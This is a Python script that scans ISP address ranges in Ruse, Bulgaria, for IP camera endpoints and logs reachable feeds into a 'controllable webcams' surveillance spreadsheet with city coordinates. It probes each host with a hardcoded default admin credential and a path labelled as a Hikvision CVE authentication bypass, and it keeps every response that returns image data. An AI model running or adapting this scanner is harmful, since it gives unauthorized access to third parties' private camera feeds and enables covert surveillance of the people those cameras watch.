"""Probe known Ruse IPs for camera/sub-stream endpoints.

Scan 79.98.x.x (Izada Ruse), 87.120.x.x (Magtel), 176.116.x.x (Energo-Pro)
for common cam paths.
"""

import os
import csv
import json
import time
import socket
import re
import urllib.request
import ssl
from concurrent.futures import ThreadPoolExecutor, as_completed

WORKDIR = r"C:\Users\eli6-admin\Documents\eli6-surveillance"
MASTER_CSV = os.path.join(WORKDIR, "controllable_Webcams.csv")
PROGRESS = os.path.join(WORKDIR, "camera_testing", "ruse_known_ips_progress.json")

# Ruse ISP ranges to probe
RUSE_NETWORKS = [
    ("Izada 79.98", "79.98.110.0/24"),  # ruse.bg, obshtinaruse.bg
    ("Magtel 87.120", "87.120.195.0/24"),  # ruseutre.bg
    ("Energo 176.116", "176.116.144.0/24"),  # energo-pro.bg
    ("Ruse Cable 212.25", "212.25.48.0/24"),  # the cam that's geofenced
]

# Cam probe paths
PROBES = [
    '/axis-cgi/mjpg/video.cgi?webcam.jpg',  # AXIS
    '/onvif-http/snapshot?auth=YWRtaW46MTEK',  # Hikvision CVE
    '/Streaming/tracks/101',  # Hikvision
    '/ISAPI/System/deviceInfo?auth=YWRtaW46MTEK',
    '/cam/realmonitor?channel=1&subtype=0',  # Dahua
    '/live/main/av_stream',  # Dahua live
    '/cgi-bin/magicBox.cgi',
    '/-wvhttp-01-/getoneshot?image=img',  # Canon VB
    '/mjpg/video.mjpg',  # Generic
    '/streaming/channels/1',  # TVT
]


def probe(args):
    ip, port, path, timeout = args
    try:
        sock = socket.create_connection((ip, port), timeout=timeout)
        req = f'GET {path} HTTP/1.0\r\nHost: {ip}\r\nAuthorization: Basic YWRtaW46MTEK\r\nConnection: close\r\n\r\n'
        sock.send(req.encode())
        data = b''
        sock.settimeout(timeout)
        try:
            while len(data) < 10000:
                d = sock.recv(4096)
                if not d: break
                data += d
        except: pass
        sock.close()
        if b'200 OK' in data[:300]:
            ct = ''
            for line in data.split(b'\r\n')[:20]:
                if line.lower().startswith(b'content-type:'):
                    ct = line[12:].strip().decode('utf-8', errors='replace')
                    break
            _, _, body = data.partition(b'\r\n\r\n')
            is_image = body.startswith(b'\xff\xd8') or body.startswith(b'\x89PNG') or b'x-mixed-replace' in body
            return {'ip': ip, 'port': port, 'path': path, 'status': 200, 'content_type': ct,
                    'is_image': is_image, 'body_size': len(body)}
    except (socket.timeout, ConnectionRefusedError, OSError):
        return None
    except Exception:
        return None
    return None


def append_to_csv(rows):
    if not rows:
        return 0
    csv.field_size_limit(2**31 - 1)
    for attempt in range(15):
        lock = MASTER_CSV + ".lock"
        try:
            fd = os.open(lock, os.O_CREAT | os.O_EXCL | os.O_RDWR)
            os.write(fd, str(os.getpid()).encode())
            os.close(fd)
            break
        except FileExistsError:
            time.sleep(2)
            continue
    try:
        existing = []
        header = None
        with open(MASTER_CSV, 'r', encoding='utf-8', errors='replace', newline='') as f:
            reader = csv.DictReader(f)
            existing = list(reader)
            header = reader.fieldnames
        if not header:
            return 0
        start = len(existing) + 1
        ts = time.strftime("%Y-%m-%d %H:%M:%S")
        appended = 0
        for row in rows:
            url = row.get('url', '')
            if not url: continue
            new_row = {k: '' for k in header}
            new_row['idx'] = str(start)
            new_row['url'] = url
            new_row['live_stream_url'] = url
            new_row['project_name'] = 'ruse_isp_scan'
            new_row['type'] = 'video' if 'mjpg' in url else 'image'
            new_row['enabled'] = '1'
            new_row['live_status'] = row.get('live_status', 'unknown')
            new_row['http_status'] = str(row.get('http_status', ''))
            new_row['content_type'] = row.get('content_type', '')
            new_row['server_header'] = row.get('server_header', '')
            new_row['brand'] = row.get('brand', 'ruse_isp_scan')
            new_row['category'] = 'public_cam'
            new_row['country'] = 'Bulgaria'
            new_row['city'] = 'Ruse'
            new_row['lat'] = '43.82306'
            new_row['lon'] = '25.95389'
            new_row['confidence'] = '0.8'
            new_row['notes'] = f"ruse_isp_scan | {ts}"
            new_row['csv_id'] = f"RUSEISP-{int(time.time())}-{start}"
            new_row['host'] = row.get('host', '')
            existing.append(new_row)
            start += 1
            appended += 1
        tmp = MASTER_CSV + ".tmp"
        for i in range(5):
            try:
                with open(tmp, 'w', encoding='utf-8', newline='') as f:
                    w = csv.DictWriter(f, fieldnames=header, lineterminator='\n', quoting=csv.QUOTE_MINIMAL)
                    w.writeheader()
                    w.writerows(existing)
                os.replace(tmp, MASTER_CSV)
                break
            except PermissionError:
                time.sleep(2)
        if os.path.exists(tmp):
            os.remove(tmp)
        if os.path.exists(lock):
            os.remove(lock)
        return appended
    except Exception:
        if os.path.exists(lock):
            try: os.remove(lock)
            except: pass
        return 0


import ipaddress
import random


def main():
    print(f'[Ruse ISP Scan] Probing {len(RUSE_NETWORKS)} ISP networks')

    # Generate all IPs to test
    targets = []
    for name, prefix in RUSE_NETWORKS:
        try:
            net = ipaddress.ip_network(prefix, strict=False)
            # Limit to useful range (skip .0 and .255)
            for ip in net.hosts():
                targets.append((str(ip), 80))
                targets.append((str(ip), 8080))
            print(f'  {name} ({prefix}): {net.num_addresses} addrs')
        except ValueError:
            pass

    random.shuffle(targets)
    print(f'  Total targets: {len(targets)}')

    progress = {}
    if os.path.exists(PROGRESS):
        try:
            with open(PROGRESS) as f:
                progress = json.load(f)
        except:
            progress = {'tested': set(), 'found': []}
    tested = set(progress.get('tested', []))

    valid = []
    ports = [80, 8080, 8443, 554]
    with ThreadPoolExecutor(max_workers=20) as ex:
        tasks = [(ip, port, path) for ip, port in targets if f'{ip}:{port}' not in tested
                 for path in PROBES[:3]]  # Just first 3 paths per (ip, port)
        found_count = 0
        for r in ex.map(probe, [(t[0], t[1], t[2], 5) for t in tasks]):
            if r:
                tested.add(f"{r['ip']}:{r['port']}")
                if r['is_image'] and r['body_size'] > 5000:
                    valid.append(r)
                    print(f'  [VALID] {r["ip"]}:{r["port"]}{r["path"]} - {r["content_type"]} body={r["body_size"]}')
                    found_count += 1

    # Save progress
    progress['tested'] = list(tested)
    progress['found'] = valid
    with open(PROGRESS, 'w') as f:
        json.dump(progress, f, indent=2)

    print(f'\n[Ruse ISP Scan] {len(valid)} valid cams found')

    # Add to master CSV
    rows = []
    for v in valid:
        url = f'http://{v["ip"]}:{v["port"]}{v["path"]}'
        rows.append({
            'url': url,
            'host': f'{v["ip"]}:{v["port"]}',
            'live_status': 'live',
            'http_status': v['status'],
            'content_type': v['content_type'],
            'server_header': '',
            'brand': 'ruse_isp_scan',
            'notes': f'ISP scan: {v["ip"]}:{v["port"]}{v["path"]}',
        })

    if rows:
        added = append_to_csv(rows)
        print(f'  Added {added} cams to master CSV')


if __name__ == '__main__':
    main()
